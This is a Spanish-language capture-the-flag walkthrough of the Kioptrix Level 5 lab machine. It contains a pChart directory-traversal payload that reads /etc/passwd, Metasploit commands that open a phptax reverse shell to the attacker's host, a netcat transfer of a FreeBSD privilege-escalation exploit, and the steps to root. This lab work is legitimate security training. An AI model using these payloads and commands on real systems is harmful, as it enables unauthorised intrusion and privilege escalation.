# Kioptrix Level 5 Walkthrough

# Kioptrix level 5

## Configuración

Para que la maquina asigne una ip hay que eliminar el adaptador de red y volver a añadirlo.

## Resolución
### Escaneo y nalisis de Vulnerabilidades
Comienzo haciendo un escaneo de la red local con arp-scan para descubrir la ip de la maquina objetivo.

```bash
arp-scan -I eth0 --localnet

-I -> indicamos la interfaz de red 
--localnet -> indicamos que genere direcciones desde la configuración de la interfaz.
```

![Untitled](Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled.png)

Obtengo que la ip de mi objetivo es la 192.168.66.163, por lo que paso a realizar un escaneo de puertos con nmap.

```bash
nmap -p- --open  -T5 -n -Pn -vvv 192.168.66.163 -oN Target
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-31 15:46 EDT
Initiating ARP Ping Scan at 15:46
Scanning 192.168.66.163 [1 port]
Completed ARP Ping Scan at 15:46, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:46
Scanning 192.168.66.163 [65535 ports]
Discovered open port 80/tcp on 192.168.66.163
Discovered open port 8080/tcp on 192.168.66.163
Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 9.90% done; ETC: 15:48 (0:01:31 remaining)
Completed SYN Stealth Scan at 15:47, 53.95s elapsed (65535 total ports)
Nmap scan report for 192.168.66.163
Host is up, received arp-response (0.00015s latency).
Scanned at 2023-08-31 15:46:49 EDT for 54s
Not shown: 65532 filtered tcp ports (no-response), 1 closed tcp port (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
80/tcp   open  http       syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 64
MAC Address: 00:0C:29:5B:14:9E (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 54.25 seconds
           Raw packets sent: 131110 (5.769MB) | Rcvd: 50 (2.410KB)
```

Observo que los puertos 80 y 8080 están abiertos, y paso a realizar un segundo escaneo mas especifico para obtener la versión de los servicios que corren.

```bash
──(root㉿kali)-[/home/kali/vulnhub/OSCP/kioptrix_level_5]
└─# nmap -p80,8080 -sCV 192.168.66.163                        
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-31 15:49 EDT
Nmap scan report for 192.168.66.163
Host is up (0.00040s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
8080/tcp open  http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
|_http-title: 403 Forbidden
MAC Address: 00:0C:29:5B:14:9E (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.05 seconds
```

Tras revisar los resultados me fije en que la versión de mod_ssl/2.2.21 es vulnerable pero el exploit para esta vulnerabilidad no contiene una versión valida para FreeBSD apache 2.2.21 por lo que no funciono.

Después pase a revisar la web con el puerto 80.

![Untitled](Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%201.png)

Y al abrir el código fuente de la pagina descubrí una dirección url.

![Untitled](Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%202.png)

Al abrirla descubrí lo siguiente:

![Untitled](Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%203.png)
### Explotación
Buscando lo que es phpchart supe que se trata de una librería de php para mostrar datos de texto de forma grafica.

Después busque si existe alguna vulnerabilidad para esta versión y di con la siguiente pagina.

[Exploiting pChart 2.1.3 (Directory traversal & XSS)](https://vk9-sec.com/exploiting-pchart-2-1-3-directory-traversal-xss/)

Leyendo veo que es vulnerable a directory traversal por lo que introduzco la siguiente dirección y obtengo el fichero /etc/passwd

```bash
http://192.168.66.163/pChart2.1.3/examples/index.php?Action=View&Script=/../../../../etc/passwd
```

Leyendo un poco mas la web descubro que los sistemas operativos FreeBSD tienen el archivo de configuración de Apache en la siguiente ruta por lo que paso a leerla.

```bash
/usr/local/etc/apache22/httpd.conf
```
![Untitled](Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%204.png)

Observando el resultado y tras intentar un log poison sin éxito veo que el fichero de configuración muestra un User-Agent permitido (Mozilla/4.0 Mozilla4 browser) y un virtualHost en el puerto 8080

A través de una extensión del navegador cambio el user agent

[https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher-revived/](https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher-revived/)

![Untitled](Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%205.png)

Con el user agent cambiado realizo la búsqueda de la web con el puerto 8080 y veo lo siguiente.

![Untitled](Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%206.png)

hago clic en phptax y aparece la siguiente pagina.

![Untitled](Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%207.png)

Buscando un exploit para phptax encuentro los siguientes

![Untitled](Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%208.png)

he decidido usar metasploit por lo que ejecutando la siguiente serie de comandos obtengo una shell.

```bash
#iniciamos metasploit
msfconsole -q
#buscamos el exploit
search phptax
#selecionamos el exploit
use 0
#configuramos
options
set RHOSTS 192.168.66.163
set RPORT 8080
show advanced
set UserAgent Mozilla/4.0 Mozilla4_browser
set payload payload/cmd/unix/reverse
set LHOST 192.168.66.152
set LPORT 4444
run
```
### Escalada de privilegios
Obtenemos una shell y enumeramos.

```bash
whoami
www
id
uid=80(www) gid=80(www) groups=80(www)
uname -a
FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan  3 07:46:30 UTC 2012     root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  amd64
```

Tras enumerar un poquito el siguiente paso que realice fue buscar si existe algún exploit para la versión de FreeBSD de la maquina.

![Untitled](Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%209.png)

Existe un exploit para escalar privilegios por lo que me lo descargo en mi maquina para después transferirlo a la maquina objetivo con netcat.

```bash
searchsploit -m freebsd/local/26368.c
  Exploit: FreeBSD 9.0 < 9.1 - 'mmap/ptrace' Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/26368
     Path: /usr/share/exploitdb/exploits/freebsd/local/26368.c
    Codes: CVE-2013-2171, OSVDB-94414
 Verified: True
File Type: C source, ASCII text
Copied to: /home/kali/vulnhub/OSCP/kioptrix_level_5/26368.c
```

Me pongo a la escucha en mi kali y me conecto desde la maquina objetivo para realizar la transferencia en el directorio /tmp.

```bash
#Kali
nc -lvp 4444 < 26368.c                            
listening on [any] 4444 ...

#kioptrix
nc -nv 192.168.66.152 4444 > 26368.c                                                                                                                                                                                                        
Connection to 192.168.66.152 4444 port [tcp/*] succeeded!
```

una vez transferido compilo el exploit y ejecuto obteniendo una shell como root

```bash
gcc 26368.c -o exploit
./exploit
whoami
root
id
uid=0(root) gid=0(wheel) egid=80(www) groups=80(www)
cat congrats.txt
If you are reading this, it means you got root (or cheated).
```

